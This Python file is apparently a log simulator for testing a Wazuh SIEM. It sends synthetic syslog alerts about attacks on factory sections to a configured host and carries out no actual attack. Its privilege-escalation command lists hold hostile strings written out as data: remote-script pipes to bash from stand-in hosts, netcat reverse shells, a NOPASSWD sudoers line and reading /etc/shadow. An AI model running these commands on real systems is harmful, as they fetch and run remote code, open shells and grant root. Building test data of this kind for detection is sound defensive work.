#!/usr/bin/env python3
import random
import time
import socket
import threading
import logging
import uuid
from datetime import datetime, timedelta


class FactoryAttackSimulator:
    """
    A class to simulate cyber attacks on different factory sections and send logs to a Wazuh server.
    Provides methods to start and stop individual or all attack simulations.
    """

    # Factory sections
    SECTIONS = [
        "purchasing",
        "manufacturing",
        "assembly",
        "packing",
        "warehouse",
        "shipping",
    ]

    # Syslog facilities and severities
    FACILITIES = {
        "kern": 0,  # kernel messages
        "user": 1,  # user-level messages
        "auth": 4,  # security/authorization messages
        "syslog": 5,  # messages generated internally by syslogd
        "local0": 16,  # local use 0
        "local1": 17,  # local use 1
        "local2": 18,  # local use 2
        "local3": 19,  # local use 3
    }

    SEVERITIES = {
        "emerg": 0,  # emergency - system is unusable
        "alert": 1,  # alert - action must be taken immediately
        "crit": 2,  # critical - critical conditions
        "err": 3,  # error - error conditions
        "warning": 4,  # warning - warning conditions
        "notice": 5,  # notice - normal but significant condition
        "info": 6,  # informational - informational messages
        "debug": 7,  # debug - debug-level messages
    }

    # Attack Types
    ATTACK_TYPES = {
        "brute_force": {
            "name": "Brute Force Authentication Attack",
            "description": "Multiple failed login attempts detected",
            "patterns": [
                "Failed password for {user} from {ip} port {port}",
                "authentication failure; logname={user} uid=0 euid=0 tty=ssh rhost={ip}",
                "Invalid user {user} from {ip} port {port}",
                "error: maximum authentication attempts exceeded for {user} from {ip} port {port}",
                "PAM {attempts} more authentication failures; logname= uid=0 euid=0 tty=ssh rhost={ip}  user={user}",
                "PAM service(sshd) ignoring max retries; {attempts} > {max_attempts}",
            ],
            "users": [
                "root",
                "admin",
                "operator",
                "system",
                "supervisor",
                "manager",
                "tech",
            ],
            "severity": "warning",
            "facility": "auth",
            "frequency": 0.5,  # Logs per second
            "duration": 120,  # Default duration in seconds
            "escalation": True,  # Whether attack escalates in severity over time
        },
        "malware_activity": {
            "name": "Malware Activity Detected",
            "description": "Suspicious file system activity indicating possible malware",
            "patterns": [
                "Suspicious process {process}[{pid}] making outbound connection to {c2_server}:{port}",
                "Unexpected file creation in {directory}: {filename} by process {process}[{pid}]",
                "Possible data exfiltration attempt: {bytes_sent} bytes sent to {ip}:{port}",
                "Unusual system behavior: process {process}[{pid}] accessing /etc/shadow",
                "Ransomware indicators: high file entropy in {directory}, possible encryption in progress",
                "Cryptominer detected: high CPU usage by process {process}[{pid}], connecting to mining pool",
            ],
            "severity": "crit",
            "facility": "local0",
            "frequency": 0.2,
            "duration": 180,
            "escalation": True,
        },
        "ddos_attack": {
            "name": "DDoS Attack",
            "description": "Distributed Denial of Service attack detected",
            "patterns": [
                "SYN flood from {ip} port {port} on interface {interface}",
                "Connection table 80% full, possible DoS attack in progress",
                "High number of half-open connections ({connections}) from multiple sources",
                "TCP RST storm detected on port {port}, possible reflected DoS",
                "Abnormal traffic pattern: {packets} packets per second on interface {interface}",
                "UDP flood targeting port {port} from multiple source IPs",
            ],
            "severity": "crit",
            "facility": "kern",
            "frequency": 1.0,
            "duration": 300,
            "escalation": True,
        },
        "data_exfiltration": {
            "name": "Data Exfiltration",
            "description": "Unusual outbound data transfers detected",
            "patterns": [
                "Unusual outbound data transfer: {bytes_sent}MB to {ip}:{port}",
                "User {user} transferred {file_count} files to external host {ip}",
                "Sensitive data access by {user}: {files_accessed} in {directory}",
                "Large email attachment ({size}MB) sent by {user} to external domain {domain}",
                "Database dump query executed by {user} on {database} ({rows} rows)",
                "Abnormal API data request: {endpoint} returned {data_size}MB of data to {ip}",
            ],
            "severity": "alert",
            "facility": "local1",
            "frequency": 0.1,
            "duration": 240,
            "escalation": True,
        },
        "privilege_escalation": {
            "name": "Privilege Escalation",
            "description": "Attempt to gain higher system privileges",
            "patterns": [
                "User {user} attempted to run sudo command: {command}",
                "NOPASSWD sudo entry detected for user {user}",
                "Unexpected SUID binary executed: {command} by {user}",
                "User {user} added to sudoers by {admin_user}",
                "Kernel exploit attempt detected in process {process}[{pid}]",
                "Buffer overflow attempt detected in {service}",
            ],
            "users": [
                "operator",
                "www-data",
                "nobody",
                "service",
                "postgres",
                "apache",
            ],
            "commands": [
                "chmod u+s",
                "nc -e /bin/bash",
                "wget http://malicious-site.com/rootkit",
                "curl -s https://evil-script.com/exploit | bash",
                "echo 'ALL ALL=(ALL) NOPASSWD: ALL'",
            ],
            "severity": "alert",
            "facility": "auth",
            "frequency": 0.3,
            "duration": 180,
            "escalation": True,
        },
        "insider_threat": {
            "name": "Insider Threat Activity",
            "description": "Suspicious internal user activity",
            "patterns": [
                "User {user} accessed {sensitivity} files outside normal working hours",
                "Unusual database query pattern by {user}: accessing {tables} tables never accessed before",
                "User {user} downloaded abnormal volume of data ({data_size}MB)",
                "Account {user} logged in from unusual location: {ip}",
                "User {user} accessed {count} records in {database} (100x their normal activity)",
                "Multiple failed attempts to access restricted area: {area} by employee ID {employee_id}",
            ],
            "users": [
                "johnson",
                "smith",
                "chen",
                "patel",
                "mueller",
                "rodriguez",
                "ibrahim",
            ],
            "severity": "warning",
            "facility": "auth",
            "frequency": 0.15,
            "duration": 480,
            "escalation": True,
        },
    }

    def __init__(self, host="localhost", port=514, log_level=logging.INFO):
        """
        Initialize the factory attack simulator

        Args:
            host (str): Wazuh server hostname/IP to send logs to
            port (int): Wazuh syslog port
            log_level (int): Logging level
        """
        self.host = host
        self.port = port
        self.running = False
        self.attacks = {}  # Dictionary to track running attacks by ID
        self.run_events = {}  # Threading events to signal each attack thread
        self.threads = []
        self.global_run_event = threading.Event()

        # Set up logging
        logging.basicConfig(
            level=log_level,
            format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
            handlers=[logging.StreamHandler()],
        )
        self.logger = logging.getLogger("factory-attack-simulator")

        # Generate a set of hostnames for each section
        self.hosts = self._generate_hosts()

        self.logger.info(
            f"Factory Attack Simulator initialized, targeting {host}:{port}"
        )

    def _generate_hosts(self, hosts_per_section=5):
        """Generate hostnames for each factory section"""
        hosts = {}
        for section in self.SECTIONS:
            section_hosts = []
            for i in range(hosts_per_section):
                device_types = [
                    "server",
                    "workstation",
                    "controller",
                    "terminal",
                    "sensor",
                    "gateway",
                    "hmi",
                    "plc",
                    "scanner",
                    "monitor",
                ]
                device_type = random.choice(device_types)
                hostname = f"{section}-{device_type}-{i+1}"
                section_hosts.append(hostname)
            hosts[section] = section_hosts

        self.logger.debug(
            f"Generated {len(hosts)} sections with {hosts_per_section} hosts each"
        )
        return hosts

    def _get_random_ip(self, internal=False):
        """Generate a random IP address"""
        if internal:
            # Generate private IP in 10.0.0.0/8 or 192.168.0.0/16
            if random.random() < 0.7:
                return f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            else:
                return f"10.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        else:
            # Generate public-looking IP (avoiding private ranges)
            first_octet = random.choice(
                [
                    random.randint(1, 9),
                    random.randint(11, 126),
                    random.randint(128, 172),
                    random.randint(174, 191),
                    random.randint(193, 223),
                ]
            )
            return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def _get_random_port(self):
        """Generate a random port number"""
        return random.randint(1024, 65535)

    def _get_random_domain(self):
        """Generate a random domain name"""
        domains = [
            "suspicious-site.com",
            "evil-domain.net",
            "data-exfil.com",
            "malware-host.org",
            "c2-server.net",
            "hacker-pool.com",
            "ransomware.cc",
            "trojan-update.com",
            "exploit-kit.net",
            "stolen-data.xyz",
            "backdoor-access.com",
            "malicious-cdn.net",
        ]
        return random.choice(domains)

    def _fill_attack_pattern(self, pattern, attack_type, section):
        """Fill an attack pattern template with realistic values"""
        result = pattern

        # Common replacements
        if "{user}" in result:
            if "users" in self.ATTACK_TYPES[attack_type]:
                result = result.replace(
                    "{user}", random.choice(self.ATTACK_TYPES[attack_type]["users"])
                )
            else:
                users = [
                    "root",
                    "admin",
                    "operator",
                    "www-data",
                    "service",
                    "oracle",
                    "postgres",
                ]
                result = result.replace("{user}", random.choice(users))

        if "{ip}" in result:
            result = result.replace("{ip}", self._get_random_ip())

        if "{port}" in result:
            result = result.replace("{port}", str(self._get_random_port()))

        if "{pid}" in result:
            result = result.replace("{pid}", str(random.randint(1000, 50000)))

        if "{process}" in result:
            processes = [
                "httpd",
                "nginx",
                "sshd",
                "bash",
                "python",
                "java",
                "mysqld",
                "postgres",
            ]
            result = result.replace("{process}", random.choice(processes))

        # Attack specific replacements
        if attack_type == "brute_force":
            if "{attempts}" in result:
                result = result.replace("{attempts}", str(random.randint(5, 20)))
            if "{max_attempts}" in result:
                result = result.replace("{max_attempts}", str(random.randint(3, 10)))

        elif attack_type == "malware_activity":
            if "{c2_server}" in result:
                result = result.replace("{c2_server}", self._get_random_domain())
            if "{directory}" in result:
                directories = [
                    "/tmp",
                    "/var/www",
                    f"/home/{section}-user",
                    "/opt",
                    "/usr/local/bin",
                ]
                result = result.replace("{directory}", random.choice(directories))
            if "{filename}" in result:
                filenames = [
                    "backdoor.php",
                    "trojan.bin",
                    "rootkit.ko",
                    "exploit.sh",
                    "malware.exe",
                ]
                result = result.replace("{filename}", random.choice(filenames))
            if "{bytes_sent}" in result:
                result = result.replace(
                    "{bytes_sent}", str(random.randint(10000, 1000000))
                )

        elif attack_type == "ddos_attack":
            if "{interface}" in result:
                result = result.replace("{interface}", f"eth{random.randint(0,1)}")
            if "{connections}" in result:
                result = result.replace(
                    "{connections}", str(random.randint(5000, 20000))
                )
            if "{packets}" in result:
                result = result.replace("{packets}", str(random.randint(10000, 100000)))

        elif attack_type == "data_exfiltration":
            if "{bytes_sent}" in result:
                result = result.replace("{bytes_sent}", str(random.randint(50, 2000)))
            if "{file_count}" in result:
                result = result.replace("{file_count}", str(random.randint(10, 500)))
            if "{files_accessed}" in result:
                sensitive_files = [
                    "customer_data.db",
                    "financials.xlsx",
                    "credentials.ini",
                    "trade_secrets.docx",
                    "employee_records.csv",
                ]
                result = result.replace(
                    "{files_accessed}", random.choice(sensitive_files)
                )
            if "{size}" in result:
                result = result.replace("{size}", str(random.randint(20, 200)))
            if "{domain}" in result:
                result = result.replace("{domain}", self._get_random_domain())
            if "{database}" in result:
                databases = [
                    "customers",
                    "orders",
                    "products",
                    "financials",
                    "employees",
                ]
                result = result.replace("{database}", random.choice(databases))
            if "{rows}" in result:
                result = result.replace("{rows}", str(random.randint(1000, 1000000)))
            if "{endpoint}" in result:
                endpoints = [
                    "/api/v1/customers",
                    "/api/v1/orders/all",
                    "/api/v1/products/export",
                    "/api/v1/reports/financial",
                    "/api/v1/users/export",
                ]
                result = result.replace("{endpoint}", random.choice(endpoints))
            if "{data_size}" in result:
                result = result.replace("{data_size}", str(random.randint(50, 500)))

        elif attack_type == "privilege_escalation":
            if "{command}" in result:
                if "commands" in self.ATTACK_TYPES[attack_type]:
                    result = result.replace(
                        "{command}",
                        random.choice(self.ATTACK_TYPES[attack_type]["commands"]),
                    )
                else:
                    commands = [
                        "chmod u+s /bin/bash",
                        "cat /etc/shadow",
                        "netcat -e /bin/sh",
                        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                    ]
                    result = result.replace("{command}", random.choice(commands))
            if "{admin_user}" in result:
                result = result.replace("{admin_user}", "root")
            if "{service}" in result:
                services = ["httpd", "nginx", "ftpd", "smbd", "postfix"]
                result = result.replace("{service}", random.choice(services))

        elif attack_type == "insider_threat":
            if "{sensitivity}" in result:
                result = result.replace(
                    "{sensitivity}",
                    random.choice(
                        ["confidential", "restricted", "secret", "proprietary"]
                    ),
                )
            if "{tables}" in result:
                tables = [
                    "customers.pii",
                    "financials.q4",
                    "employees.salaries",
                    "products.unreleased",
                ]
                result = result.replace("{tables}", random.choice(tables))
            if "{data_size}" in result:
                result = result.replace("{data_size}", str(random.randint(500, 5000)))
            if "{database}" in result:
                databases = ["CRM", "ERP", "HR", "Finance", "ProductDesign"]
                result = result.replace("{database}", random.choice(databases))
            if "{count}" in result:
                result = result.replace("{count}", str(random.randint(5000, 50000)))
            if "{area}" in result:
                areas = [
                    "server room",
                    "executive office",
                    "R&D lab",
                    "network closet",
                    "data center",
                ]
                result = result.replace("{area}", random.choice(areas))
            if "{employee_id}" in result:
                result = result.replace(
                    "{employee_id}", f"EMP-{random.randint(1000, 9999)}"
                )

        return result

    def _generate_attack_log(self, hostname, section, attack_type):
        """Generate a log message for a specific attack type"""
        attack_info = self.ATTACK_TYPES[attack_type]

        # Get random pattern from this attack type
        pattern = random.choice(attack_info["patterns"])

        # Fill the pattern with values
        message = self._fill_attack_pattern(pattern, attack_type, section)

        # Determine severity - possibly escalate over time
        if (
            attack_info["escalation"] and random.random() < 0.2
        ):  # 20% chance of escalation
            severity = random.choice(
                ["err", "crit", "alert"]
            )  # Escalate to higher severity
        else:
            severity = attack_info["severity"]

        # Choose facility
        facility = attack_info["facility"]

        # Get current timestamp
        timestamp = datetime.now().strftime("%b %d %H:%M:%S")

        # Generate process name and PID
        attack_processes = {
            "brute_force": "sshd",
            "malware_activity": random.choice(["kernel", "clamd", "rkhunter"]),
            "ddos_attack": random.choice(["kernel", "firewalld", "iptables"]),
            "data_exfiltration": random.choice(["auditd", "osqueryd", "wazuh-agent"]),
            "privilege_escalation": random.choice(["sudo", "su", "PAM"]),
            "insider_threat": random.choice(["auditd", "securityd", "access-monitor"]),
        }
        process = attack_processes.get(attack_type, "security-agent")
        pid = random.randint(1000, 65535)

        # Calculate priority value (facility * 8 + severity)
        priority = (self.FACILITIES.get(facility, 1) * 8) + self.SEVERITIES.get(
            severity, 6
        )

        # Format the final log message
        log_message = (
            f"<{priority}>{timestamp} {hostname} {process}[{pid}]: "
            f"[{section}] [{attack_type.upper()}] {message}"
        )

        return log_message

    def _send_log(self, log_message):
        """Send a log message to the Wazuh server via syslog"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_sent = sock.sendto(
                log_message.encode("utf-8"), (self.host, self.port)
            )
            return True, bytes_sent
        except Exception as e:
            self.logger.error(f"Error sending log: {e}")
            return False, 0

    def _run_attack_simulation(
        self, attack_id, attack_type, section, duration=None, frequency=None
    ):
        """
        Run a single attack simulation on a specific section

        Args:
            attack_id (str): Unique ID for this attack
            attack_type (str): The type of attack to simulate
            section (str): Factory section to target
            duration (int): How long to run in seconds
            frequency (float): Logs per second
        """
        if attack_type not in self.ATTACK_TYPES:
            self.logger.error(f"Unknown attack type: {attack_type}")
            return

        # Set duration and frequency from attack type if not specified
        if duration is None:
            duration = self.ATTACK_TYPES[attack_type]["duration"]
        if frequency is None:
            frequency = self.ATTACK_TYPES[attack_type]["frequency"]

        # Calculate sleep time
        sleep_time = 1.0 / frequency if frequency > 0 else 1.0

        # Get hostnames for this section
        section_hosts = self.hosts.get(
            section, self.hosts[random.choice(self.SECTIONS)]
        )

        # Set end time
        end_time = datetime.now() + timedelta(seconds=duration)

        self.logger.info(
            f"Starting {attack_type} attack (ID: {attack_id}) on {section} section. "
            + f"Duration: {duration}s, Frequency: {frequency} logs/sec"
        )

        # Attack progression counter for escalation
        progression = 0
        total_logs = 0

        # Run until duration is met or stopping is requested
        run_event = self.run_events[attack_id]
        while (
            datetime.now() < end_time
            and run_event.is_set()
            and self.global_run_event.is_set()
        ):
            # Select a random host from this section
            hostname = random.choice(section_hosts)

            # Generate and send log
            log_message = self._generate_attack_log(hostname, section, attack_type)
            success, _ = self._send_log(log_message)

            if success:
                total_logs += 1

                # Occasionally log to console for visibility (10% of logs)
                if random.random() < 0.1:
                    self.logger.debug(f"Attack log ({attack_id}): {log_message}")

            # Increment progression for escalation logic
            progression += 1

            # Sleep until next log
            time.sleep(sleep_time)

        # Remove this attack from tracking once it's done
        if attack_id in self.attacks:
            del self.attacks[attack_id]
            del self.run_events[attack_id]

        self.logger.info(
            f"Completed {attack_type} attack (ID: {attack_id}) on {section}. Sent {total_logs} logs."
        )

    def start_attack(self, attack_type, section=None, duration=None, frequency=None):
        """
        Start a specific attack type on a specific section

        Args:
            attack_type (str): The type of attack to simulate
            section (str, optional): Factory section to target. If None, one is randomly chosen.
            duration (int, optional): How long to run in seconds
            frequency (float, optional): Logs per second

        Returns:
            str: The attack ID that can be used to stop this specific attack
        """
        if not self.running:
            self.global_run_event.set()
            self.running = True

        # Select a random section if none provided
        if section is None:
            section = random.choice(self.SECTIONS)

        # Validate section
        if section not in self.SECTIONS:
            self.logger.error(f"Unknown section: {section}")
            return None

        # Generate a unique ID for this attack
        attack_id = f"{attack_type}-{section}-{uuid.uuid4().hex[:6]}"

        # Create a run event for this attack
        self.run_events[attack_id] = threading.Event()
        self.run_events[attack_id].set()

        # Store attack information
        self.attacks[attack_id] = {
            "type": attack_type,
            "section": section,
            "start_time": datetime.now(),
            "duration": duration
            if duration is not None
            else self.ATTACK_TYPES[attack_type]["duration"],
            "frequency": frequency
            if frequency is not None
            else self.ATTACK_TYPES[attack_type]["frequency"],
        }

        # Start the attack in a separate thread
        attack_thread = threading.Thread(
            target=self._run_attack_simulation,
            args=(attack_id, attack_type, section, duration, frequency),
        )
        attack_thread.daemon = True
        attack_thread.start()

        self.threads.append(attack_thread)
        return attack_id

    def start_random_attacks(self, count=3, duration_range=(60, 300)):
        """
        Start multiple random attacks across different sections

        Args:
            count (int): Number of different attacks to simulate
            duration_range (tuple): Min and max duration in seconds

        Returns:
            list: The attack IDs that can be used to stop specific attacks
        """
        if not self.running:
            self.global_run_event.set()
            self.running = True

        attack_ids = []

        # Get available attack types and sections
        attack_types = list(self.ATTACK_TYPES.keys())

        # Ensure we don't try to start more attacks than types available
        count = min(count, len(attack_types))

        # Start random attacks
        for _ in range(count):
            # Pick a random attack type (without replacement)
            attack_type = random.choice(attack_types)
            attack_types.remove(attack_type)

            # Pick a random section
            section = random.choice(self.SECTIONS)

            # Random duration within range
            duration = random.randint(duration_range[0], duration_range[1])

            # Start the attack
            attack_id = self.start_attack(attack_type, section, duration)
            if attack_id:
                attack_ids.append(attack_id)
                self.logger.info(
                    f"Started {attack_type} attack on {section} for {duration}s (ID: {attack_id})"
                )

        return attack_ids

    def stop_attack(self, attack_id):
        """
        Stop a specific attack simulation

        Args:
            attack_id (str): The ID of the attack to stop

        Returns:
            bool: True if the attack was successfully stopped, False otherwise
        """
        if attack_id not in self.attacks:
            self.logger.warning(f"No attack found with ID: {attack_id}")
            return False

        # Signal the thread to stop
        self.run_events[attack_id].clear()

        # Wait briefly for the thread to respond to the signal
        time.sleep(0.1)

        attack_info = self.attacks[attack_id]
        self.logger.info(
            f"Stopped {attack_info['type']} attack on {attack_info['section']} (ID: {attack_id})"
        )

        # The thread will remove itself from self.attacks when it terminates
        return True

    def stop_all_attacks(self):
        """Stop all running attack simulations"""
        self.global_run_event.clear()

        # Clear all individual run events too
        for event in self.run_events.values():
            event.clear()

        # Wait for all threads to complete
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=1.0)

        self.threads = []
        self.attacks = {}
        self.run_events = {}
        self.running = False
        self.logger.info("All attack simulations stopped")

    def get_running_attacks(self):
        """
        Get information about all currently running attacks

        Returns:
            dict: Dictionary of running attacks with their details
        """
        # Clean up any attacks that have naturally completed
        current_attacks = {}
        for attack_id, attack_info in self.attacks.items():
            if self.run_events[attack_id].is_set():
                elapsed = (datetime.now() - attack_info["start_time"]).total_seconds()
                remaining = attack_info["duration"] - elapsed

                # Include remaining time in the attack info
                attack_info_with_remaining = attack_info.copy()
                attack_info_with_remaining["remaining_seconds"] = max(0, remaining)
                attack_info_with_remaining["elapsed_seconds"] = elapsed

                current_attacks[attack_id] = attack_info_with_remaining

        return current_attacks

    def list_available_attacks(self):
        """
        List all available attack types and their descriptions

        Returns:
            dict: Attack types and descriptions
        """
        result = {}
        for attack_type, info in self.ATTACK_TYPES.items():
            result[attack_type] = {
                "name": info["name"],
                "description": info["description"],
            }
        return result


# Example usage
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Factory Attack Log Simulator")
    parser.add_argument("--host", default="localhost", help="Wazuh server hostname/IP")
    parser.add_argument("--port", type=int, default=514, help="Wazuh syslog port")
    parser.add_argument(
        "--attacks",
        type=int,
        default=3,
        help="Number of simultaneous attacks to simulate",
    )
    parser.add_argument(
        "--duration", type=int, default=300, help="Duration in seconds to run"
    )
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")

    args = parser.parse_args()

    # Set up logging level
    log_level = logging.DEBUG if args.verbose else logging.INFO

    # Create the simulator
    simulator = FactoryAttackSimulator(args.host, args.port, log_level)

    try:
        # List available attacks
        print("Available attack types:")
        for attack_type, info in simulator.list_available_attacks().items():
            print(f"- {attack_type}: {info['name']} - {info['description']}")

        print(
            f"\nStarting {args.attacks} random attacks for {args.duration} seconds..."
        )

        # Start random attacks
        attack_ids = simulator.start_random_attacks(args.attacks)

        # Allow user to interact with running attacks
        print(
            "\nRunning attacks. Commands: 'list', 'stop <attack_id>', 'stop_all', 'start <attack_type> <section>', or 'quit'"
        )

        # Main loop for interactive control
        while True:
            command = input("> ").strip()

            if command == "quit":
                break
            elif command == "list":
                running = simulator.get_running_attacks()
                print("\nRunning attacks:")
                if not running:
                    print("  No attacks currently running")
                for attack_id, info in running.items():
                    remaining = info.get("remaining_seconds", 0)
                    print(
                        f"  {attack_id}: {info['type']} on {info['section']} ({remaining:.1f}s remaining)"
                    )
            elif command.startswith("stop "):
                attack_id = command[5:].strip()
                if simulator.stop_attack(attack_id):
                    print(f"Stopped attack {attack_id}")
                else:
                    print(f"No attack found with ID {attack_id}")
            elif command == "stop_all":
                simulator.stop_all_attacks()
                print("All attacks stopped")
            elif command.startswith("start "):
                parts = command[6:].strip().split()
                if len(parts) >= 1:
                    attack_type = parts[0]
                    section = parts[1] if len(parts) > 1 else None
                    attack_id = simulator.start_attack(attack_type, section)
                    if attack_id:
                        print(f"Started {attack_type} attack with ID: {attack_id}")
                    else:
                        print(f"Failed to start attack: {attack_type}")
                else:
                    print("Usage: start <attack_type> [section]")
            else:
                print(
                    "Unknown command. Use 'list', 'stop <attack_id>', 'stop_all', 'start <attack_type> <section>', or 'quit'"
                )

    except KeyboardInterrupt:
        print("\nStopped by user")
    finally:
        # Stop all simulations
        simulator.stop_all_attacks()

